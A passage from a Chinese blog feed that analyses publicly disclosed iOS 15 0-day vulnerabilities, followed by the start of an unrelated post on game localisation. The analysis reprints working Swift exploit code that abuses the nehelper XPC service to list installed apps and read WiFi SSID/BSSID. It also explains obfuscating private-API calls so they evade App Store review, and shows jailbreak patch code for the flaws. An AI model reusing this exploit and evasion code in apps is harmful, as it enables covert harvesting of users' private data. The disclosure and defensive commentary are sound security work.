<code>cacheImageData:inSubdirectory:withFileName:handler:</code> 可能允许将任意数据写入 app 沙箱之外的位置。</p><p><strong>报告的时间线</strong></p><p>2021年3月10日：向苹果报告了漏洞<br>2021年3月10日：苹果确认了我的报告<br>2021年5月20日：请求更新状态（但没有收到回复）<br>2021年5月30日：再次请求更新状态<br>2021年7月1日：苹果回复说他们仍在调查<br>2021年7月20日：再次请求状态更新<br>2021年8月25日：苹果回复说，他们计划在即将到来的更新中解决这个问题。</p><h4 id="nehelper-enumerate-installed-apps-0-day-still-works-in-15-0-2"><a href="#nehelper-enumerate-installed-apps-0-day-still-works-in-15-0-2" class="headerlink" title="nehelper enumerate installed apps 0-day  (still works in 15.0.2)"></a>nehelper enumerate installed apps 0-day  (still works in 15.0.2)</h4><blockquote><p>漏洞在 iOS 15.0.2 还没有修复。</p></blockquote><p><strong>漏洞作用</strong></p><p>该漏洞允许任何用户安装的应用程序根据 bundle ID 确定设备上是否安装了任何应用程序。</p><p><strong>漏洞说明</strong></p><p>这个漏洞，不需要任何权限，即可判断设备是否安装了 app。</p><p>运行示例：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/83d020acd96746b58255007deb01afb8~tplv-k3u1fbpfcp-watermark.image" alt="iOS-exploit-03.png"></p><p>获取安装的 app，可以分析用户的喜好习惯等。</p><p><strong>漏洞代码</strong></p><p>漏洞攻击示例源代码：<a href="https://github.com/illusionofchaos/ios-nehelper-enum-apps-0day">GitHub</a></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isAppInstalled</span>(<span class="params">bundleId</span>: <span class="type">String</span>)</span> -&gt; <span class="type">Bool</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> connection <span class="operator">=</span> xpc_connection_create_mach_service(<span class="string">&quot;com.apple.nehelper&quot;</span>, <span class="literal">nil</span>, <span class="number">2</span>)<span class="operator">!</span></span><br><span class="line">    xpc_connection_set_event_handler(connection, &#123; <span class="keyword">_</span> <span class="keyword">in</span> &#125;)</span><br><span class="line">    xpc_connection_resume(connection)</span><br><span class="line">    <span class="keyword">let</span> xdict <span class="operator">=</span> xpc_dictionary_create(<span class="literal">nil</span>, <span class="literal">nil</span>, <span class="number">0</span>)</span><br><span class="line">    xpc_dictionary_set_uint64(xdict, <span class="string">&quot;delegate-class-id&quot;</span>, <span class="number">1</span>)</span><br><span class="line">    xpc_dictionary_set_uint64(xdict, <span class="string">&quot;cache-command&quot;</span>, <span class="number">3</span>)</span><br><span class="line">    xpc_dictionary_set_string(xdict, <span class="string">&quot;cache-signing-identifier&quot;</span>, bundleId)</span><br><span class="line">    <span class="keyword">let</span> reply <span class="operator">=</span> xpc_connection_send_message_with_reply_sync(connection, xdict)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> resultData <span class="operator">=</span> xpc_dictionary_get_value(reply, <span class="string">&quot;result-data&quot;</span>), xpc_dictionary_get_value(resultData, <span class="string">&quot;cache-app-uuid&quot;</span>) <span class="operator">!=</span> <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞分析</strong></p><p>这个代码根据前面的解析，应该就可以读懂啦。原理是 XPC 服务 <code>com.apple.nehelper</code> 有一个可以访问任何应用的方法，该方法接受 bundle ID 作为参数，如果设备上安装了具有匹配 bundle ID 的应用，则返回包含一些缓存 UUID 的数组，否则返回空数组。在 <code>/usr/libexec/nehelper</code> 的 <code>-[NEHelperCacheManager onQueueHandleMessage:]</code> 方法中执行。</p><p><strong>报告的时间线</strong></p><ul><li>2021年5月4日：向苹果报告了漏洞</li><li>2021年5月4日：苹果确认了我的报告</li><li>2021年5月20日：请求更新状态（但没有收到回复）</li><li>2021年7月20日：再次请求状态更新</li><li>2021年8月12日：苹果回复说，他们仍在调查</li></ul><h4 id="Nehelper-Wifi-Info-0-day-still-works-in-15-0-2"><a href="#Nehelper-Wifi-Info-0-day-still-works-in-15-0-2" class="headerlink" title="Nehelper Wifi Info 0-day (still works in 15.0.2)"></a>Nehelper Wifi Info 0-day (still works in 15.0.2)</h4><blockquote><p>漏洞在 iOS 15.0.2 还没有修复。</p></blockquote><p><strong>漏洞作用</strong></p><p>该漏洞允许有位置访问权限的 app 读取当前设备连接 WiFi 的 <code>SSID</code> 和 <code>BSSID</code> 信息。</p><p><strong>漏洞说明</strong></p><p>这个漏洞，需要 app 获得<code>精确位置</code>的位置权限后，即可获取设备当前连接 WiFi 的 <code>SSID</code> 和 <code>BSSID</code> 信息。</p><p>运行示例：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0778eac65e9a4ab1accee610f0306837~tplv-k3u1fbpfcp-watermark.image" alt="iOS-exploit-04.png"></p><p>获取 WiFi 的信息，一般是收集用户的连接圈，比如有5个人连接了同一个 BSSID 的 WiFi，说明他们有共同的聚合点。</p><p><strong>漏洞代码</strong></p><p>漏洞攻击示例源代码：<a href="https://github.com/illusionofchaos/ios-nehelper-wifi-info-0day">GitHub</a></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">wifi_info</span>()</span> -&gt; <span class="type">String</span>? &#123;</span><br><span class="line">    <span class="keyword">let</span> connection <span class="operator">=</span> xpc_connection_create_mach_service(<span class="string">&quot;com.apple.nehelper&quot;</span>, <span class="literal">nil</span>, <span class="number">2</span>)</span><br><span class="line">    xpc_connection_set_event_handler(connection, &#123; <span class="keyword">_</span> <span class="keyword">in</span> &#125;)</span><br><span class="line">    xpc_connection_resume(connection)</span><br><span class="line">    <span class="keyword">let</span> xdict <span class="operator">=</span> xpc_dictionary_create(<span class="literal">nil</span>, <span class="literal">nil</span>, <span class="number">0</span>)</span><br><span class="line">    xpc_dictionary_set_uint64(xdict, <span class="string">&quot;delegate-class-id&quot;</span>, <span class="number">10</span>)</span><br><span class="line">    xpc_dictionary_set_uint64(xdict, <span class="string">&quot;sdk-version&quot;</span>, <span class="number">1</span>) <span class="comment">// may be omitted entirely</span></span><br><span class="line">    xpc_dictionary_set_string(xdict, <span class="string">&quot;interface-name&quot;</span>, <span class="string">&quot;en0&quot;</span>)</span><br><span class="line">    <span class="keyword">let</span> reply <span class="operator">=</span> xpc_connection_send_message_with_reply_sync(connection, xdict)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> result <span class="operator">=</span> xpc_dictionary_get_value(reply, <span class="string">&quot;result-data&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> ssid <span class="operator">=</span> <span class="type">String</span>(cString: xpc_dictionary_get_string(result, <span class="string">&quot;SSID&quot;</span>))</span><br><span class="line">        <span class="keyword">let</span> bssid <span class="operator">=</span> <span class="type">String</span>(cString: xpc_dictionary_get_string(result, <span class="string">&quot;BSSID&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;SSID: <span class="subst">\(ssid)</span><span class="subst">\n</span>BSSID: <span class="subst">\(bssid)</span>&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞分析</strong></p><p>XPC 服务 <code>com.apple.nehelper</code> 接受用户提供的参数 <code>sdk-version</code>，如果其值小于或等于 <code>524288</code>，则跳过 app  <code>com.apple.developer.networking.wifi-info</code> 权限的检查。这使得任何符合条件的应用程序（例如，提供位置访问权限）都可以在没有所需权限的情况下访问 Wifi 信息。这在 <code>/usr/libexec/nehelper</code> 的 <code>-[NEHelperWiFiInfoManager checkIfEntitled:]</code> 方法中执行。</p><p><strong>报告的时间线</strong></p><ul><li>2021年5月2日：向苹果报告了漏洞</li><li>2021年5月4日：苹果确认了我的报告</li><li>2021年5月20日：请求更新状态（但没有收到回复）</li><li>2021年7月20日：再次请求状态更新</li><li>2021年8月6日：苹果回复说他们仍在调查</li></ul><h4 id="Apple-安全赏金计划"><a href="#Apple-安全赏金计划" class="headerlink" title="Apple 安全赏金计划"></a>Apple 安全赏金计划</h4><p><a href="https://developer.apple.com/cn/news/?id=12192019a">Apple 安全赏金计划</a> 是苹果奖励分享关键安全问题的研究人员。</p><ul><li><a href="https://developer.apple.com/security-bounty/">Apple Security Bounty</a></li></ul><p>研究人员报告 iOS、iPadOS、macOS、Apple tvOS、watchOS 和 iCloud 上的问题，并可获得最高 150 万美元的奖金。此外，Apple 也会对提交有效报告的人员公开致谢。如果获奖者捐献奖金，Apple 还会捐赠等值款项给符合条件的慈善机构。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dde3be54bb6c44359755c16b76d9346a~tplv-k3u1fbpfcp-watermark.image" alt="apple-security-bounty-payouts.png"></p><p>作者认为 <a href="https://github.com/illusionofchaos/ios-gamed-0day">illusionofchaos/ios-gamed-0day: iOS gamed exploit (fixed in 15.0.2)</a> 漏洞，根据苹果 <a href="https://developer.apple.com/security-bounty/payouts/">安全赏金计划页面</a>，这个漏洞的评估为100,000美元（对通常受 TCC 提示保护或平台沙箱保护的敏感数据的广泛应用访问。“敏感数据”访问包括从联系人获得广泛访问（即完整数据库））。</p><blockquote><p>小编注：TCC 提示保护(protected by a TCC prompt)，是 macOS 系统设置中的 “安全与隐私” 下的“隐私”选项卡中权限的管理。</p></blockquote><p>作者称自己不是第一个对苹果安全赏金计划不满意的人。以下是一些其他报告和意见：</p><ul><li><a href="https://therecord.media/researcher-discloses-iphone-lock-screen-bypass-on-ios-15-launch-day/">https://therecord.media/researcher-discloses-iphone-lock-screen-bypass-on-ios-15-launch-day/</a></li><li><a href="https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/">https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/</a></li><li><a href="https://medium.com/macoclock/apple-security-bounty-a-personal-experience-fe9a57a81943">https://medium.com/macoclock/apple-security-bounty-a-personal-experience-fe9a57a81943</a></li><li><a href="https://thezerohack.com/apple-vulnerability-bug-bounty">https://thezerohack.com/apple-vulnerability-bug-bounty</a></li><li><a href="https://www.imore.com/developer-feels-robbed-apples-security-bounty-program">https://www.imore.com/developer-feels-robbed-apples-security-bounty-program</a></li><li><a href="https://gigazine.net/gsc_news/en/20200701-apple-security-bounty-program-tcc">https://gigazine.net/gsc_news/en/20200701-apple-security-bounty-program-tcc</a></li><li><a href="https://zemnmez.medium.com/how-to-hack-apple-id-f3cc9b483a41">https://zemnmez.medium.com/how-to-hack-apple-id-f3cc9b483a41</a></li><li><a href="https://theevilbit.github.io/posts/experiences_with_asb/">https://theevilbit.github.io/posts/experiences_with_asb/</a></li><li><a href="https://twitter.com/5n1p3r0010/status/1395487939572867073">https://twitter.com/5n1p3r0010/status/1395487939572867073</a></li><li><a href="https://twitter.com/theevilbit/status/1417935753775132676">https://twitter.com/theevilbit/status/1417935753775132676</a></li><li><a href="https://twitter.com/osxreverser/status/1417939529160351745">https://twitter.com/osxreverser/status/1417939529160351745</a></li></ul><h3 id="漏洞危害性"><a href="#漏洞危害性" class="headerlink" title="漏洞危害性"></a>漏洞危害性</h3><p>首先，从上面分析，危害最大的 XPC “com.apple.gamed” 漏洞，在 iOS 15.0.2 已经修复，Apple ID 获取不到，但是通讯录功能依然能访问，另外在 15.0.1 以下的设备，可以理解为不安全的设备。所以，危害性不言而喻。</p><p>另外，作者说，关于上述漏洞代码能否进入 App Store 表示怀疑，因为苹果有严格的机器和人工审核。作者进行了反驳。</p><blockquote><p>可以想象一下，某个同性恋可处以死刑的国家的政府，在 App Stor e中有一个官方应用程序，供大多数公民使用，并希望基于性取向针对人们。例如，可以通过检查用户的设备上是否安装了 Grindr 应用程序来做到这一点。政府可能会在自己的官方应用程序中隐藏恶意代码，向 App Store 发送更新，苹果将无法检测到这一点。</p></blockquote><p>大家都知道，App Store 上传的包体会进行静态分析，对照一组预定义的私有API 检查二进制文件中的字符串列表，但如果该 API 是 Objective-C 语言，可以通过 Objective-C 运行时动态调用它。</p><p>作者在公开的漏洞源代码中，示例了动态调用苹果认为是私人 API 的一部分 C 函数，以免被静态分析检测到。 示例代码：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dylib <span class="operator">=</span> normal_function1([<span class="string">&quot;/usr/lib/system/libxp&quot;</span>, <span class="string">&quot;.dylib&quot;</span>].joined(separator: <span class="string">&quot;c&quot;</span>), <span class="number">0</span>)</span><br><span class="line"><span class="keyword">let</span> normalFunction3 <span class="operator">=</span> <span class="built_in">unsafeBitCast</span>(normal_function2(dylib, [<span class="string">&quot;xp&quot;</span>, <span class="string">&quot;_connection_create_mach_service&quot;</span>].joined(separator: <span class="string">&quot;c&quot;</span>)), to: (<span class="keyword">@convention(c)</span> (<span class="type">UnsafePointer</span>&lt;<span class="type">CChar</span>&gt;, <span class="type">DispatchQueue</span>?, <span class="type">UInt64</span>) -&gt; (<span class="type">OpaquePointer</span>)).<span class="keyword">self</span>)</span><br><span class="line"><span class="keyword">let</span> normalFunction4 <span class="operator">=</span> <span class="built_in">unsafeBitCast</span>(normal_function2(dylib, [<span class="string">&quot;xp&quot;</span>, <span class="string">&quot;_connection_set_event_handler&quot;</span>].joined(separator: <span class="string">&quot;c&quot;</span>)), to: (<span class="keyword">@convention(c)</span> (<span class="type">OpaquePointer</span>, <span class="keyword">@escaping</span> (<span class="type">OpaquePointer</span>) -&gt; <span class="type">Void</span>) -&gt; <span class="type">Void</span>).<span class="keyword">self</span>)</span><br></pre></td></tr></table></figure><p>其中 <code>dlopen</code> 和 <code>dlsym</code> 系统库函数，它们允许加载动态库并解析其中的符号。这些功能的使用可能会被 App Store 审核团队检测到，但作者表示可以避免直接使用它们。因为每个 iOS 二进制文件都会有一个名为 <code>dyld_stub_binder</code> 的符号，它是从与 dlopen 和 dlsym 相同的库中导入的。这意味着我们可以找到 dyld_stub_binder 在内存中距离 dlopen 和 dlsym 的位置，并仅使用它们的地址来调用它们。因此我们将提前计算一个特定 iOS 版本和设备型号的偏移量（参考源代码中的 <code>c.c</code> 文件）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,(<span class="keyword">long</span> <span class="keyword">long</span>)dyld_stub_binder - (<span class="keyword">long</span> <span class="keyword">long</span>)dlopen);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,(<span class="keyword">long</span> <span class="keyword">long</span>)dyld_stub_binder - (<span class="keyword">long</span> <span class="keyword">long</span>)dlsym);</span><br></pre></td></tr></table></figure><p>更复杂的恶意软件可以避免使用预定义的偏移量，并使用这些函数的签名动态查找地址。 这里就不展开了，有兴趣的朋友可以了解一下 ffi。</p><p>当然，为了不被静态分析检测到，包含函数名称的字符串应该混淆。更多可以阅读作者 <a href="https://habr.com/ru/post/580272/">文章</a>。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>关于漏洞修复，正如前文说到的，如果你的系统版本低于 iOS 15.0.2，那么关闭 Game Center、不要给“精确位置”权限，尽可能升级到最新系统，可能是最优的方案。</p><p>当然，收到的未知链接、非 AppStore 安装的 app，风险也非常的大，从上文就可以知道，不需要你的允许，你的信息可能已经被偷偷拿到。当然，如果你认为只是一些基本信息，那么可能就大意了。假如系统有一个漏洞，可能拿到你短信 app 的验证码，那么你手机号码 + 验证码，这些潜在的风险意识，也许是我们当今每个智能用户，都要懂得的保护自己设备，也是在保护自己的信息财产安全。</p><p>4个漏洞，还有2个漏洞苹果没有修复，然后，有开发者在 <a href="https://www.reddit.com/r/jailbreak/comments/pvaztb/free_release_entitlementfix_workaround_for_the_3/">reddit</a> 表示自己开发了越狱版本的修复漏洞的插件！</p><p>具体的插件源代码，可以在 <a href="https://github.com/rllbe/entitlementfix">rllbe/entitlementfix: Workaround for the 4 0-days</a> 看到：</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%hook GKAccountService</span><br><span class="line">-(<span class="keyword">void</span>)authenticatePlayerWithExistingCredentialsWithHandler:(<span class="keyword">void</span>(^)(GKAuthenticateResponse *, <span class="built_in">NSError</span> *))handler &#123;</span><br><span class="line">    <span class="keyword">void</span> (^_handler)(GKAuthenticateResponse *, <span class="built_in">NSError</span> *) = ^(GKAuthenticateResponse *response, <span class="built_in">NSError</span> *error) &#123;</span><br><span class="line">        <span class="keyword">if</span> (response &amp;&amp; ![[[<span class="keyword">self</span> clientProxy] entitlements] hasEntitlements:[%c(GKAccountServicePrivate) requiredEntitlements]]) &#123; response.credential = <span class="literal">nil</span>;</span><br><span class="line">            response.passwordChangeURL = <span class="literal">nil</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        handler(response, error);</span><br><span class="line">    &#125;;</span><br><span class="line">    %orig(_handler);</span><br><span class="line">&#125;</span><br><span class="line">%end</span><br></pre></td></tr></table></figure><p>这里是修复了 “com.apple.gamed” 漏洞，增加了获取数据前，验证当前的代码对象是否有 XPC 服务的权限。</p><p>这是修复了判断是否安装某个app的漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">%hook NEHelperCacheManager</span><br><span class="line">-(<span class="keyword">void</span>)onQueueHandleMessage:(<span class="keyword">xpc_object_t</span>)xdict &#123;</span><br><span class="line">    <span class="keyword">if</span> (xpc_dictionary_get_uint64(xdict, <span class="string">&quot;cache-command&quot;</span>) == <span class="number">3uLL</span>) &#123;</span><br><span class="line">        Class NEHelperServer = %c(NEHelperServer);</span><br><span class="line">        <span class="keyword">if</span> (![NEHelperServer verifyConnection:xpc_dictionary_get_remote_connection(xdict) hasEntitlement:<span class="string">&quot;com.apple.private.nehelper.privileged&quot;</span>]) &#123;</span><br><span class="line">            [NEHelperServer sendReplyForMessage:xdict result:<span class="number">22LL</span> data:<span class="number">0LL</span>];</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> %orig;</span><br><span class="line">&#125;</span><br><span class="line">%end</span><br></pre></td></tr></table></figure><p>修复 wifi 信息漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%hook NEHelperWiFiInfoManager</span><br><span class="line">-(BOOL)checkIfEntitled:(NSUInteger)sdkVersion &#123;</span><br><span class="line">    NSUInteger _sdkVersion = sdkVersion &lt;= <span class="number">1</span> &lt;&lt; <span class="number">19</span> ? <span class="number">1</span> &lt;&lt; <span class="number">19</span> : sdkVersion;</span><br><span class="line">    <span class="keyword">return</span> %orig(_sdkVersion);</span><br><span class="line">&#125;</span><br><span class="line">%end</span><br></pre></td></tr></table></figure><p>也许，这也是越狱的优点，本身是利用系统漏洞，最后又替系统修复了漏洞，也不需要升级系统才能修复。听起来像个笑话~</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>吃完瓜，相信有很多漏洞，没有被披露出来！或者被某些人发现了！</p><p>关于苹果有漏洞赏金计划，小编这里就不评论了，除了其它大企业都有类似的计划，对于安全研究员，这本身是一个“双赢”的计划。但是大企业，往往走的标准化流程，所以，苹果没有回应或没有及时回应的指控，其实从平时的苹果响应慢也能感受到，当然，苹果关于符合赏金计划付费的审核，可能是一个不透明的问题。这一切，导致了作者的公开了价值十万美元的漏洞！</p><p>从这个事件，让我们知道，安全的问题从来不是一件小事，而当用户信息泄漏时，可能跟用户也有直接关系。iOS 安全的问题，从这4个漏洞就表明，只是冰山一角，iOS 安全性只是相对的，所以，<strong>从用户角度，不要点击未知链接，不安装未知app，尽量更新到最新系统，可能是更加安全。</strong></p><p>欢迎大家一起在评论区交流~</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的动态~</p></blockquote><h3 id="参考引用"><a href="#参考引用" class="headerlink" title="参考引用"></a>参考引用</h3><ul><li><a href="https://habr.com/ru/post/579714/">Disclosure of three 0-day iOS vulnerabilities and critique of Apple Security Bounty program / Хабр</a></li><li><a href="https://habr.com/ru/post/580272/">How malware gets into the App Store and why Apple can’t stop that / Хабр</a></li><li><a href="https://twitter.com/illusionofcha0s">Denis Tokarev (@illusionofcha0s) / Twitter</a></li><li><a href="https://github.com/illusionofchaos/ios-gamed-0day">illusionofchaos/ios-gamed-0day: iOS gamed exploit (fixed in 15.0.2)</a></li><li><a href="https://github.com/illusionofchaos/ios-nehelper-enum-apps-0day">illusionofchaos/ios-nehelper-enum-apps-0day: iOS 15 0-day exploit (still works in 15.0.2)</a></li><li><a href="https://github.com/illusionofchaos/ios-nehelper-wifi-info-0day">illusionofchaos/ios-nehelper-wifi-info-0day: iOS 15 0-day exploit (still works in 15.0.2)</a></li><li><a href="https://github.com/illusionofchaos/ios-analyticsd-pre14.7-exploit">illusionofchaos/ios-analyticsd-pre14.7-exploit: iOS exploit (fixed in 14.7)</a></li><li><a href="https://developer.apple.com/documentation/xpc/">XPC | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/xpc/xpc_connections/">XPC Connections | Apple Developer Documentation</a></li><li><a href="https://www.objc.io/issues/14-mac/xpc/">XPC · objc.io</a></li><li><a href="https://objccn.io/issue-14-4/">ObjC 中国 - XPC</a></li><li><a href="https://support.apple.com/zh-cn/HT212601">关于 iOS 14.7 和 iPadOS 14.7 的安全性内容 - Apple 支持 (中国)</a></li><li><a href="https://support.apple.com/zh-cn/HT201222">Apple 安全性更新 - Apple 支持 (中国)</a></li><li><a href="https://zh.wikipedia.org/wiki/%E9%9B%B6%E6%97%A5%E6%94%BB%E5%87%BB">零日攻击 - 维基百科，自由的百科全书</a></li><li><a href="https://developer.apple.com/security-bounty/">Apple Security Bounty - Apple Developer</a></li><li><a href="https://developer.apple.com/security-bounty/payouts/">Apple Security Bounty - Payouts - Apple Developer</a></li><li><a href="https://support.apple.com/zh-cn/HT201220">报告安全性或隐私漏洞 - Apple 支持 (中国)</a></li><li><a href="https://www.reddit.com/r/jailbreak/comments/pvaztb/free_release_entitlementfix_workaround_for_the_3/">[Free Release] EntitlementFix: Workaround for the 3 zero-day exploits posted here today : jailbreak</a></li><li><a href="https://github.com/rllbe/entitlementfix">rllbe/entitlementfix: Workaround for the 4 0-days</a></li><li><a href="https://mp.weixin.qq.com/s/8wOq0pmsQ5c3F0uu_ioY_Q">Jailbreak #001：Gamed 0-day 漏洞</a></li><li><a href="https://mp.weixin.qq.com/s/qjC22qJHxxu2H90yyxxibg">macOS 终于开始解决 XPC 的一个大坑</a></li><li><a href="https://anquan.baidu.com/article/1427">macOS TCC 还能一如既往地保护用户隐私吗</a></li><li><a href="https://m.ithome.com/html/580405.htm">苹果 iOS 15.0.2 正式版已修复 1 个零日漏洞，但并未感谢安全研究员 - IT之家</a></li><li><a href="https://www.ithome.com/0/580/926.htm">白帽黑客 slipper 完成苹果 iPhone 13 Pro 全球首次公开远程越狱，破解过程仅 1 秒钟 - IT之家</a></li><li><a href="https://mp.weixin.qq.com/s/anxwOD53Y-ULB200fEVYAg">Macos 10.15.3 RCE</a></li><li><a href="https://www.reddit.com/r/jailbreak/comments/puuiu6/discussion_so_apparently_3_zeroday_exploits_have/">[Discussion] So apparently 3 zero-day exploits have been released. : jailbreak</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7020201677072367623&quot;&gt;iOS15 安全漏洞分析：价值10万美元的漏洞曝光 - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="iOS漏洞" scheme="https://ihtcboy.com/tags/iOS%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="0-day" scheme="https://ihtcboy.com/tags/0-day/"/>
    
    <category term="XPC" scheme="https://ihtcboy.com/tags/XPC/"/>
    
  </entry>
  
  <entry>
    <title>游戏出海本地化概述</title>
    <link href="https://ihtcboy.com/2021/09/14/2021-09-14_%E6%B8%B8%E6%88%8F%E5%87%BA%E6%B5%B7%E6%9C%AC%E5%9C%B0%E5%8C%96%E6%A6%82%E8%BF%B0/"/>
    <id>https://ihtcboy.com/2021/09/14/2021-09-14_%E6%B8%B8%E6%88%8F%E5%87%BA%E6%B5%B7%E6%9C%AC%E5%9C%B0%E5%8C%96%E6%A6%82%E8%BF%B0/</id>
    <published>2021-09-14T10:51:16.000Z</published>
    <updated>2022-02-13T13:58:11.947Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于 <a href="https://blog.csdn.net/iOSTeam37/article/details/120294727">游戏出海本地化概述 - CSDN</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p><span id="more"></span><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>最近，关于游戏的新闻经常上热搜，短短的一个月：</p><table><thead><tr><th>时间</th><th>概述</th><th>引用来源</th></tr></thead><tbody><tr><td>2021-08-03</td><td>中国新华社旗下《经济参考报》刊文，点名腾讯游戏《王者荣耀》，批评电子游戏为“精神鸦片”。（注：后来删除了“精神鸦片”、“电子毒品”等字眼。）</td><td><a href="http://www.jjckb.cn/2021-08/03/c_1310105032.htm">来源</a></td></tr><tr><td>2021-08-30</td><td>国家新闻出版署近日下发《关于进一步严格管理 切实防止未成年人沉迷网络游戏的通知》，针对未成年人过度使用甚至沉迷网络游戏问题，进一步严格管理措施，坚决防止未成年人沉迷网络游戏，切实保护未成年人身心健康。</td><td><a href="http://www.nppa.gov.cn/nppa/contents/279/98792.shtml">来源</a></td></tr><tr><td>2021-09-08</td><td>中央宣传部、国家新闻出版署有关负责人会同中央网信办、文化和旅游部等部门，对腾讯、网易等重点网络游戏企业和游戏账号租售平台、游戏直播平台进行约谈。</td><td><a href="http://politics.people.com.cn/n1/2021/0909/c1001-32221841.html">来源</a></td></tr></tbody></table><p>很多吃瓜群众看到这些新闻，就把游戏当成<strong>善恶</strong>来看待，就像菜刀，它是善是恶呢。我们回到这些通知上，国家的态度是什么呢？</p><p>很多数网友都是一棒子把死的态度，很显然，我们要看国家的态度是：<strong>防止未成年人沉迷网络游戏</strong>，我们这里不去讨论如何防止，只是想表明国家的态度，希望大家以后不要被带偏。另外，2021年7月27日，<a href="http://www.mofcom.gov.cn/article/h/redht/202107/20210703180727.shtml">关于公示2021-2022年度国家文化出口重点企业和重点项目名单的通知</a>，《2021-2022 年度国家文化出口重点企业公示名单》中，广州三七互娱科技有限公司、米哈游科技（上海）有限公司、杭州网易雷火科技有限公司、深圳市腾讯计算机系统有限公司等入围国家文化出口重点企业，说明游戏已经作为文化产业的一部分。</p><p><strong>苹果 AppStore 案件</strong></p><p>而另外一个热点，就是苹果 AppStore 垄断案，出现了几个新闻：</p><table><thead><tr><th>时间</th><th>概述</th><th>引用来源</th></tr></thead><tbody><tr><td>2021-08-26</td><td>Apple 与美国开发者就 App Store 更新达成一致，开发者可以使用电子邮件等通信方式与用户共享 iOS App 之外的支付方式信息。</td><td><a href="https://www.apple.com.cn/newsroom/2021/08/apple-us-developers-agree-to-app-store-updates/">来源</a></td></tr><tr><td>2021-08-31</td><td>韩国国会立法和司法委员会通过《电信业务法》修正案，禁止占据市场主导地位的应用商店强迫移动内容提供者使用特定支付方式。</td><td><a href="https://opinion.lawmaking.go.kr/gcom/nsmLmSts/out/2112203/detailRP">来源</a></td></tr><tr><td>2021-09-01</td><td>日本公平贸易委员会结束对 App Store 的调查，允许“阅读器”类 App 的开发者在 App 内提供访问其网站的链接，开发者可将用户引导向外部网站进行购买。（<em>阅读器 App：提供数字杂志、报纸、书籍、音频、音乐和视频的预付费内容或内容订阅。</em>）</td><td><a 